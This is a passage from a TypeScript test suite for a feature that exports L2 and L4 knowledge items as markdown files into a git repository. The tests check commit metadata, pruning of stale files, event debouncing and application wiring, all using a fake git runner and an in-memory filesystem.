		await enableExport(db, { repoPath: "/tmp/h1-custom-location" });
		await seedKnowledge(db, [{ layer: "L4", kind: "PRINCIPLES", scopeId: null, body: "c" }]);
		const runner = new FakeGitRunner("/tmp/h1-custom-location");
		const fs = createMemFs();
		await runGitExport(db, { runner, fs });

		expect(fs.files.has("/tmp/h1-custom-location/factory/PRINCIPLES.md")).toBe(true);
	});

	test("writes last_commit_at + last_commit_sha + last_push_at on pushed success", async ({
		db,
	}) => {
		await enableExport(db, { remoteUrl: "git@example.com:owner/repo.git" });
		await seedKnowledge(db, [{ layer: "L4", kind: "PRINCIPLES", scopeId: null, body: "d" }]);
		const runner = new FakeGitRunner(REPO, {
			headSha: "deadbeefcafef00d1234567890abcdef12345678",
		});
		const fs = createMemFs();
		const fixedNow = new Date("2026-04-18T09:15:00Z");
		await runGitExport(db, { runner, fs, now: () => fixedNow });

		const commitAt = await getLastCommitAt(db);
		const sha = await getLastCommitSha(db);
		const pushAt = await getLastPushAt(db);
		expect(commitAt).toBe(fixedNow.toISOString());
		expect(sha).toBe("deadbeefcafef00d1234567890abcdef12345678");
		expect(pushAt).toBe(fixedNow.toISOString());
	});

	test("writes last_commit but NOT last_push on local-only commit (no remoteUrl)", async ({
		db,
	}) => {
		await enableExport(db);
		await seedKnowledge(db, [{ layer: "L4", kind: "PRINCIPLES", scopeId: null, body: "e" }]);
		const runner = new FakeGitRunner(REPO, { headSha: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" });
		const fs = createMemFs();
		await runGitExport(db, { runner, fs, now: () => new Date("2026-04-18T10:00:00Z") });

		expect(await getLastCommitSha(db)).toBe("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa");
		expect(await getLastCommitAt(db)).toBe("2026-04-18T10:00:00.000Z");
		expect(await getLastPushAt(db)).toBeUndefined();
	});

	test("deletes tracked files that are no longer in the plan (AC4: tree mirrors DB)", async ({
		db,
	}) => {
		await enableExport(db);
		await seedKnowledge(db, [{ layer: "L2", kind: "BRIEF", scopeId: "alpha", body: "# alpha\n" }]);
		// `lsFiles` advertises a stale file from a prior export that the plan
		// no longer contains. `statusPorcelain` lives to allow future checks.
		const runner = new FakeGitRunner(REPO, {
			trackedFiles: [
				"products/alpha/BRIEF.md",
				"products/ghost/BRIEF.md", // no longer in plan — delete
				"factory/FOCUS.md", // no longer in plan — delete
			],
		});
		const fs = createMemFs({
			[`${REPO}/products/ghost/BRIEF.md`]: "stale",
			[`${REPO}/factory/FOCUS.md`]: "stale",
		});
		const result = await runGitExport(db, { runner, fs });
		expect(result.status).toBe("committed");
		if (result.status !== "committed") return;
		expect(result.filesDeleted).toEqual(
			expect.arrayContaining(["products/ghost/BRIEF.md", "factory/FOCUS.md"]),
		);
		expect(fs.files.has(`${REPO}/products/ghost/BRIEF.md`)).toBe(false);
		expect(fs.files.has(`${REPO}/factory/FOCUS.md`)).toBe(false);
	});

	test("skips delete for tracked files outside managed subtrees (no stomping)", async ({ db }) => {
		await enableExport(db);
		await seedKnowledge(db, [{ layer: "L4", kind: "PRINCIPLES", body: "p" }]);
		const runner = new FakeGitRunner(REPO, {
			trackedFiles: ["README.md", "LICENSE"],
		});
		const fs = createMemFs({ [`${REPO}/README.md`]: "readme" });
		const result = await runGitExport(db, { runner, fs });
		// README.md outside factory/ + products/ — must not be deleted.
		expect(fs.files.get(`${REPO}/README.md`)).toBe("readme");
		if (result.status === "committed") {
			expect(result.filesDeleted).not.toContain("README.md");
		}
	});
});

describe("registerGitExportHandler", () => {
	let unsubscribe: (() => void) | undefined;

	function emitKnowledgeUpdated(
		eventBus: import("@hyperidle/shared").EventBus,
		itemId: string,
	): void {
		const ev: KnowledgeUpdatedEvent = {
			type: "knowledge_updated",
			streamId: crypto.randomUUID(),
			itemId,
			action: "updated",
			timestamp: Date.now(),
		};
		eventBus.emit(ev);
	}

	afterEach(async () => {
		unsubscribe?.();
		unsubscribe = undefined;
		vi.useRealTimers();
	});

	test("ignores non-L2/L4 knowledge items", async ({ db, eventBus }) => {
		vi.useFakeTimers();
		const runner = new FakeGitRunner(REPO);
		const fs = createMemFs();
		await enableExport(db);
		await seedKnowledge(db, [{ id: "ki-l1", layer: "L1", kind: "PRINCIPLES", body: "ignored" }]);
		unsubscribe = registerGitExportHandler(db, eventBus, { runner, fs, debounceMs: 10 });

		emitKnowledgeUpdated(eventBus, "ki-l1");
		await vi.advanceTimersByTimeAsync(50);

		expect(runner.calls).toHaveLength(0);
	});

	test("ignores L4 items with unknown kind", async ({ db, eventBus }) => {
		vi.useFakeTimers();
		const runner = new FakeGitRunner(REPO);
		const fs = createMemFs();
		await enableExport(db);
		await seedKnowledge(db, [{ id: "ki-weird", layer: "L4", kind: "MYSTERY_KIND", body: "weird" }]);
		unsubscribe = registerGitExportHandler(db, eventBus, { runner, fs, debounceMs: 10 });

		emitKnowledgeUpdated(eventBus, "ki-weird");
		await vi.advanceTimersByTimeAsync(50);

		expect(runner.calls).toHaveLength(0);
	});

	test("debounces a burst of events into a single export run", async ({ db, eventBus }) => {
		vi.useFakeTimers();
		const runner = new FakeGitRunner(REPO);
		const fs = createMemFs();
		await enableExport(db);
		await seedKnowledge(db, [
			{ id: "ki-burst", layer: "L4", kind: "PRINCIPLES", scopeId: null, body: "from handler" },
		]);
		unsubscribe = registerGitExportHandler(db, eventBus, { runner, fs, debounceMs: 100 });

		emitKnowledgeUpdated(eventBus, "ki-burst");
		await vi.advanceTimersByTimeAsync(20);
		emitKnowledgeUpdated(eventBus, "ki-burst");
		await vi.advanceTimersByTimeAsync(20);
		emitKnowledgeUpdated(eventBus, "ki-burst");
		expect(runner.calls.filter((c) => c.cmd === "commit")).toHaveLength(0);

		await vi.advanceTimersByTimeAsync(200);
		expect(runner.calls.filter((c) => c.cmd === "commit")).toHaveLength(1);
	});

	test("fires the export after the debounce window", async ({ db, eventBus }) => {
		vi.useFakeTimers();
		const runner = new FakeGitRunner(REPO);
		const fs = createMemFs();
		await enableExport(db);
		await seedKnowledge(db, [
			{ id: "ki-fire", layer: "L4", kind: "PRINCIPLES", scopeId: null, body: "from handler" },
		]);
		unsubscribe = registerGitExportHandler(db, eventBus, { runner, fs, debounceMs: 50 });

		emitKnowledgeUpdated(eventBus, "ki-fire");
		expect(runner.calls.filter((c) => c.cmd === "commit")).toHaveLength(0);
		await vi.advanceTimersByTimeAsync(100);
		expect(runner.calls.filter((c) => c.cmd === "commit")).toHaveLength(1);
	});

	test("unsubscribe stops further runs", async ({ db, eventBus }) => {
		vi.useFakeTimers();
		const runner = new FakeGitRunner(REPO);
		const fs = createMemFs();
		await enableExport(db);
		await seedKnowledge(db, [
			{ id: "ki-unsub", layer: "L4", kind: "PRINCIPLES", scopeId: null, body: "from handler" },
		]);
		const dispose = registerGitExportHandler(db, eventBus, { runner, fs, debounceMs: 30 });
		dispose();

		emitKnowledgeUpdated(eventBus, "ki-unsub");
		await vi.advanceTimersByTimeAsync(200);
		expect(runner.calls).toHaveLength(0);
	});

	test("invokes runnerFactory at fire time with the current repoPath (production wiring)", async ({
		db,
		eventBus,
	}) => {
		vi.useFakeTimers();
		const fs = createMemFs();
		await enableExport(db);
		await seedKnowledge(db, [
			{ id: "ki-factory", layer: "L4", kind: "PRINCIPLES", scopeId: null, body: "from handler" },
		]);
		const captured: string[] = [];
		const runnerForPath = new FakeGitRunner(REPO);
		unsubscribe = registerGitExportHandler(db, eventBus, {
			debounceMs: 10,
			fs,
			runnerFactory: (repoPath) => {
				captured.push(repoPath);
				return runnerForPath;
			},
		});

		emitKnowledgeUpdated(eventBus, "ki-factory");
		await vi.advanceTimersByTimeAsync(50);

		expect(captured).toEqual([REPO]);
		expect(runnerForPath.calls.filter((c) => c.cmd === "commit")).toHaveLength(1);
	});

	test("does nothing when config was disabled between event and fire", async ({ db, eventBus }) => {
		vi.useFakeTimers();
		const runner = new FakeGitRunner(REPO);
		const fs = createMemFs();
		await enableExport(db);
		await seedKnowledge(db, [
			{ id: "ki-toggle", layer: "L4", kind: "PRINCIPLES", scopeId: null, body: "from handler" },
		]);
		unsubscribe = registerGitExportHandler(db, eventBus, { runner, fs, debounceMs: 50 });

		emitKnowledgeUpdated(eventBus, "ki-toggle");
		// Operator disables mid-debounce.
		await setConfigKV(db, { enabled: false });
		await vi.advanceTimersByTimeAsync(100);
		expect(runner.calls.filter((c) => c.cmd === "commit")).toHaveLength(0);
	});
});

/**
 * End-to-end wiring proof for AC1. The production `createApp()` path MUST
 * attach a runner such that an emitted `knowledge_updated` event triggers
 * an export — not just the FakeGitRunner-wired unit tests above. We prove
 * this by injecting `gitRunnerFactory` and observing that the event bus,
 * the handler, and the runner all cooperate.
 */
describe("createApp -> git-export wiring (AC1 production path)", () => {
	beforeEach(async () => {
		vi.stubEnv("HYPERIDLE_API_KEY", "test-key-app-wiring");
	});

	afterEach(async () => {
		vi.unstubAllEnvs();
		vi.useRealTimers();
	});

	test("event-triggered export reaches the runner factory created in app.ts", async ({
		db,
		eventBus,
	}) => {
		await enableExport(db, { debounceMs: 10 });
		await seedKnowledge(db, [
			{ id: "ki-e2e", layer: "L4", kind: "PRINCIPLES", body: "from e2e", topic: null },
		]);
		vi.useFakeTimers();

		const factoryCalls: string[] = [];
		const runner = new FakeGitRunner(REPO);
		const app = await createApp({
			db,
			eventBus,
			// O3: gitRunnerFactory moved out of AppOptions. Use serviceBootstrap
			// to inject a custom runner factory for this test.
			serviceBootstrap: ({ db: testDb, eventBus: testBus }) => {
				const disposers: Array<() => void> = [];
				disposers.push(
					registerGitExportHandler(testDb, testBus, {
						runnerFactory: (repoPath) => {
							factoryCalls.push(repoPath);
							return runner as unknown as GitRunner;
						},
					}),
				);
				return disposers;
			},
		});
		try {
			const ev: KnowledgeUpdatedEvent = {
				type: "knowledge_updated",
				streamId: crypto.randomUUID(),
				itemId: "ki-e2e",
				action: "updated",
				timestamp: Date.now(),
			};
			eventBus.emit(ev);
			// Allow the void-async handler to await its DB queries and register
			// the debounce setTimeout before we advance fake timers.
			await Promise.resolve();
			await Promise.resolve();
			await vi.advanceTimersByTimeAsync(100);
			// Allow the fire() async path (loadGitExportConfig + runGitExport) to settle.
			await Promise.resolve();
			await Promise.resolve();

			expect(factoryCalls).toEqual([REPO]);
			expect(runner.calls.filter((c) => c.cmd === "commit")).toHaveLength(1);
		} finally {
			disposeApp(app);
		}
	});
});
